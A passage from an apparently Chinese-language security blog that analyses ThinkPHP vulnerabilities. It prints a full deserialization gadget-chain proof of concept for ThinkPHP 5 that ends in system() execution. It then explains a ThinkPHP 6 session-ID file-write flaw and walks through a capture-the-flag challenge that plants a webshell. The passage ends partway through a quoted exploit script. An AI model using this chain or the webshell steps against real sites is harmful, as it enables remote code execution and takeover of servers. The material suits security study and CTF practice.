class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取原始数据</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$name</span> = (<span class="keyword">string</span>) <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> != <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="comment">// 解析name</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">list</span>(<span class="variable">$name</span>, <span class="variable">$type</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$data</span>, <span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析过滤器</span></span><br><span class="line">        <span class="variable">$filter</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFilter</span>(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$data</span>, [<span class="variable">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">version_compare</span>(PHP_VERSION, <span class="string">&#x27;7.1.0&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">arrayReset</span>(<span class="variable">$data</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterValue</span>(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$type</span>) &amp;&amp; <span class="variable">$data</span> !== <span class="variable">$default</span>) &#123;</span><br><span class="line">            <span class="comment">// 强制类型转换</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">typeCast</span>(<span class="variable">$data</span>, <span class="variable">$type</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中<strong>input</strong>函数的参数**$data**不可控，继续找一个调用<code>input</code>函数的地方。找到了<code>param</code>函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">            <span class="variable">$method</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">method</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 自动获取请求变量</span></span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$method</span>) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PATCH&#x27;</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(<span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;param = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">route</span>(<span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">            <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file</span>();</span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>) ? <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$file</span>) : <span class="variable language_">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$data</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>参数依旧不可控</p><p>继续找调用<code>param</code>函数的地方。找到了<code>isAjax</code>函数</p><p><img src="https://img-blog.csdnimg.cn/7dc1fde9c201411da755adabd1c94ce5.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>其中<code>$this-&gt;config[&#39;var_ajax&#39;]</code>可控,意味着<code>param</code>函数中的<code>$name</code>可控。<code>param</code>函数中的<code>$name</code>可控就意味着<code>input</code>函数中的<code>$name</code>可控。</p><p>所以<code>$this-&gt;param</code>是get参数可控</p><p>之后再<strong>input</strong>函数中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解析过滤器</span></span><br><span class="line">       <span class="variable">$filter</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFilter</span>(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">           <span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$data</span>, [<span class="variable">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br></pre></td></tr></table></figure><p><strong>array_walk_recursive</strong>函数</p><p>对数组中的每个元素应用用户自定义函数</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>array</em></td><td align="left">必需。规定数组。</td></tr><tr><td align="left"><em>myfunction</em></td><td align="left">必需。用户自定义函数的名称。</td></tr><tr><td align="left"><em>parameter,…</em></td><td align="left">可选。规定用户自定义函数的参数，您可以为函数设置一个或多个参数。</td></tr></tbody></table><p>这里利用<strong>array_walk_recursive</strong>函数来调用<strong>filterValue</strong>方法，其中作为参数的**$filter<strong>是通过</strong>getFilter**方法得到的</p><p><img src="https://img-blog.csdnimg.cn/2a9d5dd1b4764985ad299d44b62fba00.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>其中**$filter&#x3D;$this-&gt;filter**可控</p><p>所以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$data</span>, [<span class="variable">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br></pre></td></tr></table></figure><p><code>$data</code>，<code>filter</code>都彻底可控了，即<code>$value = call_user_func($filter, $value)</code>，回调函数和参数都可控，即可构造POC了。</p><p><strong>POC</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span>=[];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>=[];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append=[<span class="string">&quot;lyy9&quot;</span>=&gt;[<span class="string">&#x27;xxx&#x27;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data=[<span class="string">&quot;lyy9&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook[<span class="string">&#x27;visible&#x27;</span>] = [<span class="variable language_">$this</span>, <span class="string">&#x27;isAjax&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0st-9/images/main/image/1.png" alt="在这里插入图片描述">)</p><h1 id="ThinkPHP6任意文件操作漏洞分析"><a href="#ThinkPHP6任意文件操作漏洞分析" class="headerlink" title="ThinkPHP6任意文件操作漏洞分析"></a>ThinkPHP6任意文件操作漏洞分析</h1><h2 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>phpstudy+thinkphp(&lt;&#x3D;6.0.0版本&lt;&#x3D;6.0.2) + php7以上</strong></p><p>thinkphp6只能利用composer下载，参考<a href="https://gh0st-9.github.io/2021/11/26/Windows%E4%B8%8Bphpstudy%E5%AE%89%E8%A3%85composer%E5%8F%8A%E5%85%B6thinkphp%E5%90%84%E7%89%88%E6%9C%AC/">文章</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=<span class="number">6.0</span>.<span class="number">0</span> tp6.<span class="number">0</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c5e2cc1ae0fd473ca97982f102884e00.png" alt="在这里插入图片描述"></p><p>下载完成后访问**localhost&#x2F;tp6.0&#x2F;public&#x2F;**生效</p><p>至此环境搭建完毕</p><h2 id="漏洞剖析"><a href="#漏洞剖析" class="headerlink" title="漏洞剖析"></a>漏洞剖析</h2><p><strong>首先看看官方信息</strong></p><p><img src="https://img-blog.csdnimg.cn/9d4de9bfdf034c5ea249d2036b47e81f.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>可以看到官方对<strong>src&#x2F;think&#x2F;session&#x2F;Store.php</strong>中在<strong>id</strong>设置时多增加了一个函数，因此猜测可能是在存储<strong>Session</strong>时导致了文件写入</p><p>所以我们来到<strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;Store.php</strong>，对<strong>save()<strong>方法中的</strong>write</strong>函数进行跟踪</p><p><img src="https://img-blog.csdnimg.cn/924c83fdacbc41299a34847e9ca58e1a.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.php</strong></p><p><img src="https://img-blog.csdnimg.cn/cb8762317b604f2cad0ed0e8557a6d5d.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>又调用了<strong>writeFile</strong>函数，跟进</p><p><strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.php</strong></p><p><img src="https://img-blog.csdnimg.cn/03337613909c45b1af80ad7f6eabfc44.png" alt="在这里插入图片描述"></p><p>发现<strong>file_put_contents</strong>函数，果然是能写入文件的操作</p><p>反向分析一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>,<span class="variable">$content</span>,LOCK_EX)中的参数<span class="variable">$path</span>,<span class="variable">$content</span>来源于<span class="title function_ invoke__">writeFile</span>(<span class="variable">$path</span>,<span class="variable">$data</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">writeFile</span>(<span class="variable">$path</span>,<span class="variable">$data</span>)中的参数<span class="variable">$path</span>,<span class="variable">$data</span>来源于<span class="title function_ invoke__">write</span>(String <span class="variable">$sessID</span>,String <span class="variable">$sessData</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">write</span>(String <span class="variable">$sessID</span>,String <span class="variable">$sessData</span>)中的参数<span class="variable">$sessID</span>,<span class="variable">$sessData</span>来源于<span class="title function_ invoke__">save</span>()中调用了<span class="title function_ invoke__">write</span>()</span><br></pre></td></tr></table></figure><p>所以最终推导出文件名就是来自于<strong>getId()<strong>得到的</strong>$sessionId</strong>的值</p><p><img src="https://img-blog.csdnimg.cn/09b30c1622f54c8e871db7785a1352b5.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>结合<strong>setId</strong>和<strong>getId</strong>，发现:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当传入的id值长度为32时，创建sessionId，然后进行gitId()</span><br></pre></td></tr></table></figure><p>那么接下来就应寻找调用<strong>setID</strong>的地方，发现在<strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;middleware&#x2F;SessionInit.php</strong></p><p><img src="https://img-blog.csdnimg.cn/4bcc5b283d744104bc0bf3a283135d0b.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>对这里的<strong>getName</strong>进行追踪发现，**$cookieName**&#x3D;<strong>PHPSESSID</strong></p><p><img src="https://img-blog.csdnimg.cn/232af69eba7c4ac497f476c9bbd72041.png" alt="在这里插入图片描述"></p><p>而**$sessionId**<code>是</code><strong>cookie</strong>中名为<strong>PHPSESSID</strong>的值，因为<strong>sessionId</strong>是攻击者可控的，从而导致写入的文件名可控</p><p>而写入的内容是创建<strong>session</strong>使用的内容。但是<strong>session</strong>的内容是由实际的后端业务逻辑来决定的，况且默认环境下并没有创建<strong>session</strong>。因此，默认环境下无法做到任意文件写入。想要做到任意文件写入的条件是非常苛刻的</p><p>如果要getshell的话，后端需要有类似的<code>Session::Set(&#39;name&#39;,$_POST[&#39;abc&#39;])</code>代码才可以实现</p><p>同时，在进行深入分析后，发现还可以实现<strong>任意文件删除</strong>，且文件删除对后端业务逻辑依赖较低。</p><h2 id="例题实操-1"><a href="#例题实操-1" class="headerlink" title="例题实操"></a>例题实操</h2><h3 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h3><p>这里通过<strong>dirsearch</strong>进行目录扫描能获取到<strong><a href="http://www.zip/">www.zip</a></strong>下载即可获得源码，这里就不分析了，就是利用上面的漏洞变化出来的</p><p>启动题目，在注册账号登陆时，用bp截包，将session长度改为32位的php文件</p><p><img src="https://img-blog.csdnimg.cn/5b43cf46dcc3437fb89baed6c266e4fb.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>之后登录，进入搜索界面，写入一句话木马</p><p><img src="https://img-blog.csdnimg.cn/d6628d9b9af64342b0a1fc86a5056c5e.png" alt="在这里插入图片描述"></p><p>点击搜索后，便成功写入，</p><p><strong>这里简单说一下</strong>，因为发现网上关于为什么在搜索框处写入木马都没有介绍</p><p>下载源码后，发现</p><p><strong>app\home\controller\Member.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Request</span>::<span class="title function_ invoke__">isPost</span>())&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">session</span>(<span class="string">&#x27;?UID&#x27;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/home/member/login&#x27;</span>);            </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">input</span>(<span class="string">&quot;post.&quot;</span>);</span><br><span class="line">            <span class="variable">$record</span> = <span class="title function_ invoke__">session</span>(<span class="string">&quot;Record&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">session</span>(<span class="string">&quot;Record&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title function_ invoke__">session</span>(<span class="string">&quot;Record&quot;</span>,<span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$recordArr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$record</span>);</span><br><span class="line">                <span class="variable">$recordLen</span> = <span class="title function_ invoke__">sizeof</span>(<span class="variable">$recordArr</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$recordLen</span> &gt;= <span class="number">3</span>)&#123;</span><br><span class="line">                    <span class="title function_ invoke__">array_shift</span>(<span class="variable">$recordArr</span>);</span><br><span class="line">                    <span class="title function_ invoke__">session</span>(<span class="string">&quot;Record&quot;</span>,<span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$recordArr</span>) . <span class="string">&quot;,&quot;</span> . <span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">                    <span class="keyword">return</span> <span class="title class_">View</span>::<span class="title function_ invoke__">fetch</span>(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">session</span>(<span class="string">&quot;Record&quot;</span>,<span class="variable">$record</span> . <span class="string">&quot;,&quot;</span> . <span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">View</span>::<span class="title function_ invoke__">fetch</span>(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">View</span>(<span class="string">&quot;search&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里的<strong>search函数会把搜索框POST数据存到session文件里面</strong></p><p>文件路径是<br><code>runtime/session/sess_123456789123456789123456789a.php</code></p><p>用蚁剑连接</p><p>在根目录下发现<strong>flag</strong></p><p><img src="https://img-blog.csdnimg.cn/b7ba6cc0a46e4c05a9fcf022d65ef6a6.png" alt="在这里插入图片描述"></p><p>但是还需执行<strong>readflag</strong>才能获取</p><p>这里直接上<strong>github</strong>上的脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 